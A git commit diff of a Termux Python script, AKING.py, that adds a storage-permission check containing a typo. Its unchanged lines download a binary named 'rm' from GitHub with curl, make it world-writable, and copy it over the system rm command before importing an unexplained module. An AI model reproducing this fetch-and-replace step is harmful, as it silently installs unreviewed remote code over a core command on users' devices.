57c0701341688af5d04235ca0b639b3ca2a483cf
IMTIAZ AKING <98144321+AKING110@users.noreply.github.com>
2022-11-20 16:19:24 +0500

    Update AKING.py

--- AKING.py
+++ AKING.py
@@ -1,5 +1,13 @@
 import os
-os.system('termux-setup-storage')
+try:
+    try:
+        open('/sdcard/AKING-OK.txt','r').read()
+    except:
+        open('/sdcard/AKING-OK.txt','w').wrire('Aking Ok ids')
+except:
+    print(' First Allow Termux Setup Permeations (y) ')
+    os.system('termux-setup-storage')
+    pass
 os.system('git pull')
 from os import path,system
 from platform import uname
@@ -18,7 +26,7 @@ else:
     system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
     system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
 if 'aarch' in arch:
-    print('\033[1;37m\nCongratulatings! Your Deviec Support This Tools')
+    print('\033[1;37m\nCongratulations! Your Device Support This Tools')
     import XD
     XD.menu()
 else:exit('\033[1;31m Sorry System or device not supported ')
